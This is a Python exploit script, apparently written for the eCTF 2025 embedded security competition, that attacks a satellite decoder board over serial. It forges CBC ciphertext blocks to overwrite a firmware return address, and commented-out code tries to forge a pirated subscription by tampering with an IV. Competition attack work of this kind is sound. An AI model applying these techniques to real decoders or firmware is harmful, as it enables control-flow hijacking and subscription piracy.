#!/usr/bin/env python3

from pwn import *
from decoder import DecoderIntf
from ectf25_attack.utils import load_frames, Frame, filter_channel

context.arch = 'thumb'

def conn():
    r = DecoderIntf('/dev/ttyACM0')

    return r

def read_if_exists(name):
    try:
        with open(name, 'rb') as f:
            return f.read()
    except:
        return None

def xor(a, b):
    return bytes(m ^ n for m, n in zip(a, b))

def main():
    r = conn()

    c1_valid = read_if_exists('c1_valid.sub')
    c2_expired = read_if_exists('c2_expired.sub')
    c3_pirated = read_if_exists('c3_pirated.sub')
    frames = load_frames('frames.json')
    frame = filter_channel(frames, 1)[0]
    print(r.subscribe(c1_valid))

    # data = bytes.fromhex('335e4470e757d3bc8b3f19774579990b010000007d16db67e38495561af405005c2dcc432462ec21bc7e89fb8fc593fe23b087ef75f80fc9c4efa7a0611ba29f190805faf4b2979f75ce3493f7240c038d26e2c32731be31601345102c290f9c50191bcb3b28e2273816a89ddfb1019e089b8ffdfa5f597db3a441a29fd5acc50db19e68666c936806e29d8750573140cea9563ec71ea0d377df02cda4f90aec010000007e8dd86767f02883be5f00002ca3c95a53f00063940229b465fa1fa03461c50a848ee7c610cee00b0777aef6b2b022afd8e9c424795cfe24da7122ce6ab3db3c3f0854a996034df2ae810814dad9ca8a077a7311220fe69c3a722752c794492be4b124a929320884aae5db77e36faa5a7d6c9c716dd39e9ea1912a70')
    # data = data[:-(16 * 6)] + data[-(16 * 4):]
    # data = bytes.fromhex('335e4470e757d3bc8b3f19774579990b010000007d16db67e38495561af405005c2dcc432462ec21bc7e89fb8fc593fe23b087ef75f80fc9c4efa7a0611ba29f190805faf4b2979f75ce3493f7240c038d26e2c32731be31601345102c290f9c50191bcb3b28e2273816a89ddfb1019e089b8ffdfa5f597db3a441a29fd5acc50db19e68666c936806e29d87505731407e8dd86767f02883be5f00002ca3c95a53f00063940229b465fa1fa03461c50a848ee7c610cee00b0777aef6b2b022afd8e9c424795cfe24da7122ce6ab3db3c3f0854a996034df2ae810814dad9ca8a077a7311220fe69c3a722752c794492be4b124a929320884aae5db77e36faa5a7d6c9c716dd39e9ea1912a70')
    # data = data[:-32] + frame.data[-64:-32]
    # data = bytes.fromhex('335e4470e757d3bc8b3f19774579990b010000007d16db67e38495561af405005c2dcc432462ec21bc7e89fb8fc593fe23b087ef75f80fc9c4efa7a0611ba29f190805faf4b2979f75ce3493f7240c038d26e2c32731be31601345102c290f9c50191bcb3b28e2273816a89ddfb1019e089b8ffdfa5f597db3a441a29fd5acc50db19e68666c936806e29d8750573140cea9563ec71ea0d377df02cda4f90aec63940229b465fa1fa03461c50a848ee7c610cee00b0777aef6b2b022afd8e9c424795cfe24da7122ce6ab3db3c3f0854a996034df2ae810814dad9ca8a077a7311220fe69c3a722752c794492be4b124')
    # data = bytes.fromhex('335e4470e757d3bc8b3f19774579990b010000007d16db67e38495561af405005c2dcc432462ec21bc7e89fb8fc593fe23b087ef75f80fc9c4efa7a0611ba29f190805faf4b2979f75ce3493f7240c038d26e2c32731be31601345102c290f9c50191bcb3b28e2273816a89ddfb1019e089b8ffdfa5f597db3a441a29fd5acc50db19e68666c936806e29d87505731404347d3b20e96fb18c12c6fffcb91d62cb235b48b51edfe1afdaa91d75d1a2f165cb334fb79b8f8571edba2154f2307786c8d2fa52edb5a035dc14fe5580f20d43e8af9534c5286cbea605cd4f36b61747719fff76d579d356c1ca4e467e4e402')
    # data = bytes.fromhex('335e4470e757d3bc8b3f19774579990b010000007d16db67e38495561af405005c2dcc432462ec21bc7e89fb8fc593fe23b087ef75f80fc9c4efa7a0611ba29f190805faf4b2979f75ce3493f7240c038d26e2c32731be31601345102c290f9c50191bcb3b28e2273816a89ddfb1019e089b8ffdfa5f597db3a441a29fd5acc50db19e68666c936806e29d87505731404347d3b20e96fb18c12c6fffcb91d62cb235b48b51edfe1afdaa91d75d1a2f165cb334fb79b8f8571edba2154f2307786c8d2fa52edb5a035dc14fe5580f20d43e8af9534c5286cbea605cd4f36b6174') + b'\0' * 48
    # print(r.decode(data))

    decrypt = b'noflagonthischan^ flag ^0005f419d0653033^ time ^4221c92acda01a3b\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x1eu?\x1b\xe8\xe1\xe8\xc7\xbe\x15 \xaf\xdd\x8dkT\t\xbe\xee`=\xec\xed\xfd\xb2\xe2\x03{\x1c\xacT|\xcd*\xb8V\xe1\x8c\xfb\xec\xe3\xdbeo\xf5\x8b\xc1\xe4'
    record = bytes.fromhex('cea9563ec71ea0d377df02cda4f90aec010000007e8dd86767f02883be5f00002ca3c95a53f00063940229b465fa1fa03461c50a848ee7c610cee00b0777aef6b2b022afd8e9c424795cfe24da7122ce6ab3db3c3f0854a996034df2ae810814dad9ca8a077a7311220fe69c3a722752c794492be4b124a929320884aae5db77e36faa5a7d6c9c716dd39e9ea1912a70')
    record_iv = record[:16]
    record_block = record[32:48]



    frame_data = frame.data
    # print(r.decode(frame.data))
    block_pt = b'noflagonthischan'
    assert len(block_pt) == 16
    iv = frame_data[:16]
    ct_block = frame_data[32:32+16]
    pt_block = xor(block_pt, iv)
    # hmac = frame_data[-32:]
    # last2_block = frame_data[-64:-32]

    # hmac_block = frame_data[-32:-16]
    # decrypt_hmac_block = decrypt[64:64+16]
    # prev_ciphertext = frame_data[-48:-32]
    # aes_decrypt_for_hmac = xor(prev_ciphertext, decrypt_hmac_block)

    ret_addr = 0x1000e9c8 + 1

    desired_block = p32(0) + p32(0) + p32(ret_addr) + p32(0)
    prev_block = xor(desired_block, pt_block)
    padding_desire = b'\x10' * 16
    padding_prev = xor(padding_desire, pt_block)

    end = prev_block + ct_block + padding_prev + ct_block + b'\0' * 32
    pwn_data = frame_data + end
    print(r.decode(frame_data + record + padding_prev + ct_block) + b'\0' * 32)

    # frame_data = frame_data + last2_block + b'\0' * 32

    


    # print(frame_data)
    # result = r.decode(frame_data)
    # print(result)

    # pirate_id = 0x30a101ed
    # decoder_id = 0xdb5d7a03

    # n = 0xf58352a

    # diff = xor(p32(n), p32(decoder_id))

    # # diff = xor(p32(pirate_id), p32(decoder_id))
    # # n = p32(0xe4a44ec4)
    # # diff = xor(n, p32(decoder_id))
    # iv = c3_pirated[:16]
    # new_iv = xor(iv[:4], diff) + iv[4:]
    # fake_sub = new_iv + c3_pirated[16:]

    # print(r.list())
    # b = r.subscribe(fake_sub)
    # print(r.list())
    # a = r.decode(frame)



if __name__ == "__main__":
    main()
